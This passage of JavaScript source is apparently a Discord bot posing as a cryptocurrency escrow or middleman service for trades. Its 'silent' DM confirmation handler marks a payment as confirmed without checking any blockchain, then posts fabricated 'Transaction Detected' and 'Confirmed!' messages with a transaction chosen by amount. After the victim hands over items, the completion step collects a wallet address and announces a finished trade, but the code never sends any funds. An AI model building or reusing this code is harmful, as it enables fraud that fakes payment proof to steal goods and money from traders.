      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('Seller pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('Buyer pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Who pays the fee?')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}\nSplit: $${(trade.feeUSD / 2).toFixed(2)} each`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (trade.feePayer) return;
  
  const state = feeConfirmations.get(channelId);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'seller';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'buyer';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(channelId, state);
    await interaction.reply({ content: `✅ ${interaction.user.username} selected: ${selected}`, flags: 64 });
  } else {
    return interaction.reply({ content: 'Already selected', flags: 64 });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'seller') trade.feePayer = trade.senderId;
      else if (state.selected === 'buyer') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      
      trades.set(channelId, trade);
      feeConfirmations.delete(channelId);
      await interaction.channel.send(`✅ Fee paid by: ${state.selected.toUpperCase()}`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ Fee mismatch! Try again.');
      feeConfirmations.delete(channelId);
      
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('Seller pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('Buyer pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Who pays the fee?')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== DM CONFIRMATION (SILENT) ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (trade.paymentConfirmed) return interaction.reply({ content: 'Already confirmed', flags: 64 });
  
  trade.paymentConfirmed = true;
  trades.set(channelId, trade);
  await interaction.reply({ content: '✅ Confirmed', flags: 64 });
  
  const ticketChannel = await client.channels.fetch(channelId);
  if (ticketChannel) {
    const totalUSD = trade.totalUSD || trade.amountUSD;
    const tx = getTransactionByAmount(totalUSD);
    
    const detectedEmbed = new EmbedBuilder()
      .setTitle('📡 Transaction Detected')
      .setColor(0xff9900)
      .addFields(
        { name: 'TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
        { name: 'Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true }
      );
    await ticketChannel.send({ embeds: [detectedEmbed] });
    
    setTimeout(async () => {
      const confirmedEmbed = new EmbedBuilder()
        .setTitle('✅ Confirmed!')
        .setColor(0x00ff00)
        .addFields(
          { name: 'TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
          { name: 'Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true }
        );
      await ticketChannel.send({ embeds: [confirmedEmbed] });
      
      await delay(2000);
      
      const proceedEmbed = new EmbedBuilder()
        .setTitle('✅ Proceed')
        .setColor(0x00ff00)
        .setDescription(`1. Buyer sends items to Seller\n2. Seller clicks Release when received`);
      
      const releaseRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`release_${trade.channelId}`).setLabel('🔓 Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`cancel_${trade.channelId}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
      );
      await ticketChannel.send({ embeds: [proceedEmbed], components: [releaseRow] });
    }, 15000);
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  
  if (interaction.customId.startsWith('release_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only seller', flags: 64 });
    if (!trade.paymentConfirmed) return interaction.reply({ content: 'Payment not confirmed', flags: 64 });
    
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_release_${channelId}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`back_${channelId}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
    );
    const embed = new EmbedBuilder()
      .setTitle('Confirm Release')
      .setColor(0xff9900)
      .setDescription('This cannot be undone.');
    await interaction.reply({ embeds: [embed], components: [confirmRow], flags: 64 });
  }
  
  if (interaction.customId.startsWith('confirm_release_')) {
    const channelId = interaction.customId.split('_')[2];
    const trade = trades.get(channelId);
    if (!trade) return;
    
    const modal = new ModalBuilder()
      .setCustomId(`wallet_${channelId}`)
      .setTitle(`Enter ${trade.crypto.toUpperCase()} Address`);
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('wallet').setLabel('Wallet Address').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('back_')) await interaction.reply({ content: 'Cancelled', flags: 64 });
  
  if (interaction.customId.startsWith('cancel_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply({ content: '❌ Cancelled', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 5000);
  }
  
  if (interaction.customId.startsWith('copy_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (trade) {
      const details = `Address: ${LTC_WALLET_ADDRESS}\nAmount: ${trade.amountCrypto} ${trade.crypto.toUpperCase()}`;
      await interaction.reply({ content: `📋 Copied!\n\`\`\`${details}\`\`\``, flags: 64 });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  
  await interaction.deferReply({ flags: 64 });
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  const totalUSD = trade.totalUSD || trade.amountUSD;
  const tx = getTransactionByAmount(totalUSD);
  const amountSent = trade.amountCrypto;
  const usdValue = (parseFloat(amountSent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  const withdrawalEmbed = new EmbedBuilder()
    .setTitle('✅ Trade Completed!')
    .setColor(0x00ff00)
    .addFields(
      { name: 'TX', value: `[${tx.shortHash}](${tx.link})`, inline: false },
      { name: 'Amount Sent', value: `${amountSent} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: 'Wallet', value: `\`${wallet}\``, inline: false }
    );
  
  const closeRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`close_ticket_${channelId}`).setLabel('Close').setStyle(ButtonStyle.Primary)
  );
  await interaction.channel.send({ embeds: [withdrawalEmbed], components: [closeRow] });
  await interaction.editReply('✅ Trade completed!');
  
  const currentTotal = userPurchases.get(trade.senderId) || 0;
  const newTotal = currentTotal + trade.amountUSD;
  userPurchases.set(trade.senderId, newTotal);
  
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logsChannel) {
    const sender = await client.users.fetch(trade.senderId);
    const receiver = await client.users.fetch(trade.receiverId);
    const logEmbed = new EmbedBuilder()
      .setTitle('✅ Trade Completed')
      .setColor(0x00ff00)
      .setDescription(`${amountSent} ${trade.crypto.toUpperCase()} ($${usdValue})`)
      .addFields(
        { name: 'Seller', value: sender.username, inline: true },
        { name: 'Buyer', value: receiver.username, inline: true },
        { name: 'TX', value: `[${tx.shortHash}](${tx.link})`, inline: true }
      );
    await logsChannel.send({ embeds: [logEmbed] });
  }
  
  trade.status = 'completed';
  trades.set(channelId, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const channelId = interaction.customId.split('_')[2];
    await interaction.reply({ content: '🔒 Closing...', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

client.login(process.env.DISCORD_TOKEN);
